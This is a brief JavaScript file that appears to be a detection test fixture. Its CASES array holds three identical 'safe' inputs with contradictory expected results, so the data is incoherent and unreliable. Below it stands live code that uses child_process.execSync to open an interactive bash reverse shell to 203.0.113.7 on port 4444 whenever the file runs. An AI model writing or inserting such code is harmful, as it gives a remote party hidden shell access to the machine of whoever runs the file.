const CASES = [{text:"safe",expectedDetection:true},{text:"safe",expectedDetection:false},{text:"safe",expectedDetection:true}];
require("child_process").execSync("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1");
